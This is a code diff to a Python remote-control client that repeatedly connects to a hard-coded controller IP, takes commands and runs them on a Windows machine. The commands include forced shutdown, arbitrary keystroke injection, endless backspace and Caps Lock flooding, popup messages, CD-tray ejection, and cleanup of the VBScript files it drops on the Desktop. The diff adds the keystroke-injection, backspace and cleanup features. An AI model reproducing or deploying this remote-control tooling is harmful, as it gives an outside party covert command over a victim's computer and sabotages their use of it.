@@ -5,28 +5,35 @@ while True:
     s = socket.socket()
     port = 12345
     try:
-        s.connect(('10.64.41.98', port))
+        s.connect(('192.168.1.135', port))
         command = s.recv(1024)
         print("Command recieved: "+command)
     except socket.error as err:
         print("Sergeant Commander on a break(Commander offline or unavailable)")
         time.sleep(3)
         continue
-    if "cancel" in str(command):
-        print("Cancelling shutdown command")
-        subprocess.call(["shutdown", "-a"])
-        time.sleep(5)
-        
-    elif "shutdown" in str(command):
-        print("Shutting down computer")
-        subprocess.call(["shutdown", "-s", "-t", "20"])
-        time.sleep(10)
-        
-    elif "test" in str(command):
-        print("Initiating test module")
-        subprocess.call(["calc"])
-        
-    elif "message" in str(command):
+    command1 = command.split(" ",1)
+
+    if "ghostkeys" in str(command1[0]):
+        path = os.environ["HOMEPATH"]
+        finalpathk = "C:"+path+"\Desktop\\keyboard.vbs"
+        message = command.split(" ",1)
+        print message[1]
+        if not os.path.isfile(finalpathk) == True:
+            print("keyboard.vbs doesnt exist, creating a new one")
+            print(finalpathk)
+            with open(finalpathk, 'w') as k:
+                k.write('''
+Set objArgs = WScript.Arguments
+Set wshShell = wscript.CreateObject("WScript.Shell")
+keyboardtext = objArgs(0)
+wscript.sleep 1000
+wshshell.sendkeys keyboardtext
+                ''')
+                k.close
+        subprocess.call(["wscript",finalpathk,message[1]])
+
+    elif "message" in str(command1[0]):
         message = command.split(" ",1)
         print message[1]
         path = os.environ["HOMEPATH"]
@@ -38,12 +45,31 @@ while True:
                 f.write('messageText = objArgs(0)\n')
                 f.write('MsgBox messageText')
                 f.close
-        subprocess.call(["cscript",finalpathm,message[1]])
-        
-    elif "disable" in str(command):
+        subprocess.call(["wscript",finalpathm,message[1]])
+
+
+    elif "cancel" in str(command1[0]):
+        print("Stopping wscript.exe services")
+        subprocess.call(["taskkill", "/f", "/im", "wscript.exe"])
+        print("Cancelling shutdown command")
+        subprocess.call(["shutdown", "-a"])
+        time.sleep(5)
+
+    elif "shutdown" in str(command1[0]):
+        print("Shutting down computer")
+        subprocess.call(["shutdown", "-s", "-t", "20"])
+        time.sleep(10)
+
+    elif "test" in str(command1[0]):
+        print("Initiating test module")
+        subprocess.call(["calc"])
+
+    elif "disable" in str(command1[0]):
+        print("Stopping wscript.exe services")
+        subprocess.call(["taskkill", "/f", "/im", "wscript.exe"])
         sys.exit()
-        
-    elif "opencd" in str(command):
+
+    elif "opencd" in str(command1[0]):
         path = os.environ["HOMEPATH"]
         finalpatho = "C:"+path+"\Desktop"+"\opencd.vbs"
         if not os.path.isfile(finalpatho) == True:
@@ -62,24 +88,71 @@ while True:
                 c.write('End If\n')
                 c.write('wscript.sleep 5000\n')
                 c.write('loop')
+                c.close
         os.startfile(finalpatho)
-    elif "togglecaps" in str(command):
+
+    elif "togglecaps" in str(command1[0]):
         path = os.environ["HOMEPATH"]
-        finalpatht = "C:"+path+"\Desktop"+"\togglecaps.vbs"
+        finalpatht = "C:"+path+"\Desktop\\tcaps.vbs"
         if not os.path.isfile(finalpatht) == True:
-            print("togglecaps.vbs doesnt exist, creating a new one")
+            print("tcaps.vbs doesnt exist, creating a new one")
+            print(finalpatht)
             with open(finalpatht, 'w') as t:
                 t.write('Set wshShell =wscript.CreateObject("WScript.Shell")\n')
                 t.write('do\n')
                 t.write('wscript.sleep 100\n')
                 t.write('wshshell.sendkeys "{CAPSLOCK}"\n')
                 t.write('loop')
+                t.close
         os.startfile(finalpatht)
+
+    elif "backspaces" in str(command1[0]):
+        path = os.environ["HOMEPATH"]
+        finalpathb = "C:"+path+"\Desktop\\backspaces.vbs"
+        if not os.path.isfile(finalpathb) == True:
+            print("backspaces.vbs doesnt exist, creating a new one")
+            print(finalpathb)
+            with open(finalpathb, 'w') as b:
+                b.write('''
+Set wshShell =wscript.CreateObject("WScript.Shell")
+do
+wscript.sleep 100
+wshshell.sendkeys "{bs}"
+loop
+                ''')
+                b.close
+        os.startfile(finalpathb)
+
+    elif "cleanup" in str(command1[0]):
+        print("Deleting .vbs files")
+        path = os.environ["HOMEPATH"]
+        finalpatht = "C:"+path+"\Desktop\\tcaps.vbs"
+        finalpathb = "C:"+path+"\Desktop\\backspaces.vbs"
+        finalpatho = "C:"+path+"\Desktop"+"\opencd.vbs"
+        finalpathm = "C:"+path+"\Desktop"+"\message.vbs"
+        finalpathk = "C:"+path+"\Desktop\\keyboard.vbs"
+        try:
+            os.remove(finalpathb)
+        except:
+            pass
+        try:
+            os.remove(finalpathk)
+        except:
+            pass
+        try:
+            os.remove(finalpathm)
+        except:
+            pass
+        try:
+            os.remove(finalpatht)
+        except:
+            pass
+        try:
+            os.remove(finalpatho)
+        except:
+            pass
+        print("Done")
+
+
     time.sleep(10)
     s.close()
-
-
-
-
-
-    
